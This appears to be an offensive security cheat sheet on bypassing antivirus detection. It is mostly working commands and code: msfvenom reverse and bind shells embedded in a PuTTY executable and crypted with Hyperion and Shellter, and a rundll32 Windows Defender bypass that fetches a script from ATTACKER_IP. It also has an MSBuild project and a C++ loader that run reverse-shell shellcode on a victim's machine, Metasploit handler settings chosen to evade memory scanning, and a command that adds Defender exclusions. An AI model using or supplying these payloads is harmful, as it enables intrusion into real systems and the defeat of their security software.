# :christmas_tree: Bypassing Antivirus Payload Detection:

<img width="704" alt="Screen Shot 2021-12-03 at 5 21 54 PM" src="https://user-images.githubusercontent.com/72598486/144680706-d3b91529-e530-4dcf-b0b9-50a0c94413d2.png">


# MSFvenom reverse stageless shells 
```bash
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -f exe-only -k -x /root/payloads/putty_x86.exe -o /root/payloads/msfvenom/msfv_reverse_putty_x86.exe - e x86/shikata_ga_nai -i 20 LHOST=192.168.40.128 LPORT=55555 
msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp -f exe-only -k - x /root/payloads/putty_x64.exe -o /root/payloads/msfvenom/msfv_reverse_putty_x64.exe -e x64/xor -i 20 LHOST=192.168.40.128 LPORT=55555 
```
# MSFVenom bind stageless shell 
```bash
msfvenom -a x86 --platform windows -p windows/shell_bind_tcp -f exe-only -k -x /root/payloads/putty_x86.exe -o /root/payloads/msfvenom/msfv_bind_putty_x86.exe -e x86/shikata_ga_nai -i 20 RHOST=0.0.0.0 LPORT=55555 
msfvenom -a x64 --platform windows -p windows/x64/shell_bind_tcp -f exe-only -k -x /root/payloads/putty_x64.exe -o /root/payloads/msfvenom/msfv_bind_putty_x64.exe -e x64/xor -i 20 RHOST=0.0.0.0 LPORT=55555 
```
# Hyperion 2.31 x64 Payload Generating Strings 
```bash
wine hyperion.exe /root/payloads/msfvenom/msfv_reverse_putty_x64.exe /root/payloads/hyperion/hyperion_reverse_putty_x64.exe 
wine hyperion.exe /root/payloads/msfvenom/msfv_bind_putty_x64.exe /root/payloads/hyperion/hyperion_bind_putty_x64.exe 
```
# Hyperion 2.2 x86 Payload Generating Strings 
```bash
wine hyperion.exe /root/payloads/msfvenom/msfv_reverse_putty_x86.exe /root/payloads/hyperion/hyperion_reverse_putty_x86.exe 
wine hyperion.exe /root/payloads/msfvenom/msfv_bind_putty_x86.exe /root/payloads/hyperion/hyperion_bind_putty_x86.exe 
```
# MSFVenom RAW Shellter Payload Generating Strings with only x86 supported 
```bash
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -f raw -o /root/payloads/shellter/shellter_reverse_x86.raw -e x86/shikata_ga_nai -i 20 LHOST=192.168.40.128 LPORT=55555 
msfvenom -a x86 --platform windows -p windows/shell_bind_tcp -f raw -o /root/payloads/shellter/shellter_bind_x86.raw -e x86/shikata_ga_nai -i 20 RHOST=0.0.0.0 LPORT=55555 
```
# Hyperion 2.2 x86 encrypt a Shellter payload 
```bash
wine hyperion.exe /root/payloads/shellter/shellter_putty_bind_x86.exe /root/payloads/hyperion/hyperion_shellter_bind_putty_x86.exe 
wine hyperion.exe /root/payloads/shellter/shellter_putty_reverse_x86.exe /root/payloads/hyperion/hyperion_shellter_reverse_putty_x86.exe 
```

# VirusTotal and YARA Detection 
<img width="583" alt="Screen Shot 2021-12-03 at 5 22 12 PM" src="https://user-images.githubusercontent.com/72598486/144680778-e92bd81b-7a97-4559-a564-44ba0217cd0f.png">

Source: ```https://sansorg.egnyte.com/dl/Kj3fXQlZ6x```

# Windows Defender Detection Bypass

Currently, Windows Defender detects and prevents TrojanWin32Powessere.G aka "POWERLIKS" type execution that leverages rundll32.exe. Attempts at execution fail
and attackers will get an "Access is denied" error message. However, it can be easily bypassed by passing an extra path traversal when referencing mshtml.

```cmd
C:\>rundll32.exe javascript:"\..\..\mshtml,RunHTMLApplication ";alert(1)
Access is denied.
```

Pass an extra "..\" to the path.

```C:\>rundll32.exe javascript:"\..\..\..\mshtml,RunHTMLApplication ";alert(666)```

Windows Defender also detects based on the following javascript call using GetObject("script:http://ATTACKER_IP/hi.tmp").
However, that interference can be bypassed by using concatenation when constructing the URL scheme portion of the payload.

```cmd
C:\>rundll32.exe javascript:"\..\..\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://ATTACKER_IP/hi.tmp")
Access is denied.
```

# Living Off the Land with MSBuild:

MSBuild.exe is a built-in Windows tool for building and executing C/C++/C# code.

```bash
user@kali $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.55 LPORT=443 -f csharp > WindowsHelper.cs
```

Insert shellcode into line 46 and output as .csproj file:

```C#
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
         <!-- This inline task executes shellcode. -->
         <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
         <!-- Save This File And Execute The Above Command -->
         <!-- Author: Casey Smith, Twitter: @subTee -->
         <!-- License: BSD 3-Clause -->
	  <Target Name="Hello">
	    <ClassExample />
	  </Target>
	  <UsingTask
	    TaskName="ClassExample"
	    TaskFactory="CodeTaskFactory"
	    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
	    <Task>
	    
	      <Code Type="Class" Language="cs">
	      <![CDATA[
		using System;
		using System.Runtime.InteropServices;
		using Microsoft.Build.Framework;
		using Microsoft.Build.Utilities;
		public class ClassExample :  Task, ITask
		{         
		  private static UInt32 MEM_COMMIT = 0x1000;          
		  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
		  [DllImport("kernel32")]
		    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
		    UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
		  [DllImport("kernel32")]
		    private static extern IntPtr CreateThread(            
		    UInt32 lpThreadAttributes,
		    UInt32 dwStackSize,
		    UInt32 lpStartAddress,
		    IntPtr param,
		    UInt32 dwCreationFlags,
		    ref UInt32 lpThreadId           
		    );
		  [DllImport("kernel32")]
		    private static extern UInt32 WaitForSingleObject(           
		    IntPtr hHandle,
		    UInt32 dwMilliseconds
		    );          
		  public override bool Execute()
		  {
			//replace with your own shellcode
		    byte[] shellcode = new byte[] { 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0x0a,0x00,0x00,0x05,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x67,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0x0f,0x85,0x70,0xff,0xff,0xff,0xe9,0x9b,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };
		      
		      UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
			MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		      Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
		      IntPtr hThread = IntPtr.Zero;
		      UInt32 threadId = 0;
		      IntPtr pinfo = IntPtr.Zero;
		      hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
		      WaitForSingleObject(hThread, 0xFFFFFFFF);
		      return true;
		  } 
		}     
	      ]]>
	      </Code>
	    </Task>
	  </UsingTask>
	</Project>
```

On the victim's machine:

Identify MSBuild version

```cmd
dir /b /s C:\msbuild.exe
```

Execute project

```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe WindowsHelper.csproj
```

# Generating Self-Signed Certificates:

Msfvenom randomizes SSL certificates. Such certificates could be detected by signature scanning. You can bypass it by creating your custom SSL certificate.

```bash
openssl req -new -x509 -nodes -out cert.crt -keyout priv.key
```

Create a .pem file:

```bash
cat priv.key cert.crt > custom.pem
```

Change CipherString=DEFAULT@SECLEVEL=2 in /etc/ssl/openssl.cnf to:

```bash
CipherString = DEFAULT
```

# Metasploit Listener:

There are some advanced options in the Metasploit multi/handler module that can help you bypass anti-virus. The first of them is the SSL option. When set to true you listener will be using SSL for the connection. You can use created above custom self-signed certificate for this purpose.

```bash
set payload windows/x64/meterpreter/reverse_http
set SSL true
set HandlerSSLCert /home/RoseSecurity/custom.pem
```

Another very handy option is to turn off autoloading of stdapi which is responsible to load the default commands of the meterpreter. When loaded, it reserves a space in memory to load meterpreter functions. Anti-viruses scan all the process memory for this signature and can detect that as malicious. If you set it to false, the meterpreter will behave like a common connection. After getting the reverse shell, you can load stdapi manually.

```bash
set AutoLoadStdapi false
```

AutoVerifySession option makes the meterpreter send another connection after establishing the first connection to see if it is alive. It can be detected too.

```bash
set AutoVerifySession false
```

When you connect to the target, make sure that you load the stdapi to achieve full shell functionality:

```bash
meterpreter> load stdapi
```

@Karmaz95

## Encrypted Meterpreter Payloads:

Metasploit Framework Encryption Formats:

```bash
$ msfvenom -l encrypt

Framework Encryption Formats [--encrypt <value>]
================================================

Name
----

aes256
base64
rc4
xor
```

The syntax below generates a windows/meterpreter/reverse_tcp that is encrypted with RC4. It is also generated in C format, so that you can build your own loader in C/C++.

```bash
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 --encrypt rc4 --encrypt-key supersecretkey -f c
```

Although antivirus isn’t good at scanning encrypted shellcode statically, run-time monitoring is still a strong line of defense. It is easy to get caught after you decrypt and execute it.

## Obfuscated Python for Evasion:

Resource: ```https://development-tools.net/python-obfuscator/```

Example Script:

```python
#!/usr/bin/env python3
print("Gotcha!")
```

Results:

```python
# Python code obfuscated by www.development-tools.net 
 
import base64, codecs
magic = 'IyEvdXNyL2Jpbi'
love = '9yoaLtpUy0nT9h'
god = 'MwpwcmludCgiR2'
destiny = '90L2uuVFVcPt=='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
```

## PowerShell Exclusion Paths:

If you want to create a trusted file, file type, folder, or a process that Windows Security has detected as malicious, you can stop Windows Security from alerting you or blocking the program by adding the file to the exclusions list. This can be done via the following PowerShell command:

```
powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath $ENV:USERPROFILE\Downloads
```

## Custom Templates for Msfvenom:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f c -b \x00\x0a\x0d
```

```c++
#include "stdafx.h"
#include "Windows.h"

int main()
{
	unsigned char shellcode[] =
		"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff"
		"\xff\xff\x48\xbb\x1d\xbe\xa2\x7b\x2b\x90\xe1\xec\x48\x31\x58"
		"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xe1\xf6\x21\x9f\xdb\x78"
		"\x21\xec\x1d\xbe\xe3\x2a\x6a\xc0\xb3\xbd\x4b\xf6\x93\xa9\x4e"
		"\xd8\x6a\xbe\x7d\xf6\x29\x29\x33\xd8\x6a\xbe\x3d\xf6\x29\x09"
		"\x7b\xd8\xee\x5b\x57\xf4\xef\x4a\xe2\xd8\xd0\x2c\xb1\x82\xc3"
		"\x07\x29\xbc\xc1\xad\xdc\x77\xaf\x3a\x2a\x51\x03\x01\x4f\xff"
		"\xf3\x33\xa0\xc2\xc1\x67\x5f\x82\xea\x7a\xfb\x1b\x61\x64\x1d"
		"\xbe\xa2\x33\xae\x50\x95\x8b\x55\xbf\x72\x2b\xa0\xd8\xf9\xa8"
		"\x96\xfe\x82\x32\x2a\x40\x02\xba\x55\x41\x6b\x3a\xa0\xa4\x69"
		"\xa4\x1c\x68\xef\x4a\xe2\xd8\xd0\x2c\xb1\xff\x63\xb2\x26\xd1"
		"\xe0\x2d\x25\x5e\xd7\x8a\x67\x93\xad\xc8\x15\xfb\x9b\xaa\x5e"
		"\x48\xb9\xa8\x96\xfe\x86\x32\x2a\x40\x87\xad\x96\xb2\xea\x3f"
		"\xa0\xd0\xfd\xa5\x1c\x6e\xe3\xf0\x2f\x18\xa9\xed\xcd\xff\xfa"
		"\x3a\x73\xce\xb8\xb6\x5c\xe6\xe3\x22\x6a\xca\xa9\x6f\xf1\x9e"
		"\xe3\x29\xd4\x70\xb9\xad\x44\xe4\xea\xf0\x39\x79\xb6\x13\xe2"
		"\x41\xff\x32\x95\xe7\x92\xde\x42\x8d\x90\x7b\x2b\xd1\xb7\xa5"
		"\x94\x58\xea\xfa\xc7\x30\xe0\xec\x1d\xf7\x2b\x9e\x62\x2c\xe3"
		"\xec\x1c\x05\xa8\x7b\x2b\x95\xa0\xb8\x54\x37\x46\x37\xa2\x61"
		"\xa0\x56\x51\xc9\x84\x7c\xd4\x45\xad\x65\xf7\xd6\xa3\x7a\x2b"
		"\x90\xb8\xad\xa7\x97\x22\x10\x2b\x6f\x34\xbc\x4d\xf3\x93\xb2"
		"\x66\xa1\x21\xa4\xe2\x7e\xea\xf2\xe9\xd8\x1e\x2c\x55\x37\x63"
		"\x3a\x91\x7a\xee\x33\xfd\x41\x77\x33\xa2\x57\x8b\xfc\x5c\xe6"
		"\xee\xf2\xc9\xd8\x68\x15\x5c\x04\x3b\xde\x5f\xf1\x1e\x39\x55"
		"\x3f\x66\x3b\x29\x90\xe1\xa5\xa5\xdd\xcf\x1f\x2b\x90\xe1\xec"
		"\x1d\xff\xf2\x3a\x7b\xd8\x68\x0e\x4a\xe9\xf5\x36\x1a\x50\x8b"
		"\xe1\x44\xff\xf2\x99\xd7\xf6\x26\xa8\x39\xea\xa3\x7a\x63\x1d"
		"\xa5\xc8\x05\x78\xa2\x13\x63\x19\x07\xba\x4d\xff\xf2\x3a\x7b"
		"\xd1\xb1\xa5\xe2\x7e\xe3\x2b\x62\x6f\x29\xa1\x94\x7f\xee\xf2"
		"\xea\xd1\x5b\x95\xd1\x81\x24\x84\xfe\xd8\xd0\x3e\x55\x41\x68"
		"\xf0\x25\xd1\x5b\xe4\x9a\xa3\xc2\x84\xfe\x2b\x11\x59\xbf\xe8"
		"\xe3\xc1\x8d\x05\x5c\x71\xe2\x6b\xea\xf8\xef\xb8\xdd\xea\x61"
		"\xb4\x22\x80\xcb\xe5\xe4\x57\x5a\xad\xd0\x14\x41\x90\xb8\xad"
		"\x94\x64\x5d\xae\x2b\x90\xe1\xec";

	void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcode, sizeof shellcode);
	((void(*)())exec)();

    return 0;
}
```
